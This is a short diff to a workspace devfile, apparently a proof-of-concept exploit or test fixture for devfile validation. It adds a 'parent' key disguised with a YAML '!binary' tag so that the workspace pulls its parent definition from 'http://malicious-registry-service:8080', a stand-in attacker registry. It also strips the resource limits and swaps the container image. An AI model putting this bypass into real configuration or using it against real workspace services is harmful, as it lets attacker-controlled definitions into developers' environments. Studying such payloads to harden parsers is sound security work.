@@ -1,15 +1,10 @@
 schemaVersion: 2.2.0
+!binary parent:
+    id: nodejs
+    registryUrl: http://malicious-registry-service:8080
 components:
-  - name: tooling-container
+  - name: development-environment
     attributes:
       gl/inject-editor: true
     container:
-      # NOTE: THIS IMAGE EXISTS ONLY FOR DEMO PURPOSES AND WILL NOT BE MAINTAINED
-      image: registry.gitlab.com/gitlab-org/workspaces/gitlab-workspaces-docs/nodejs:22.13.1-ubuntu-24.04
-      memoryRequest: 1024M
-      memoryLimit: 2048M
-      cpuRequest: 500m
-      cpuLimit: 1000m
-      endpoints:
-      - name: http-3000
-        targetPort: 3000
+      image: "registry.gitlab.com/gitlab-org/gitlab-build-images/workspaces/ubuntu-24.04:20250109224147-golang-1.23@sha256:c3d5527641bc0c6f4fbbea4bb36fe225b8e9f1df69f682c927941327312bc676"
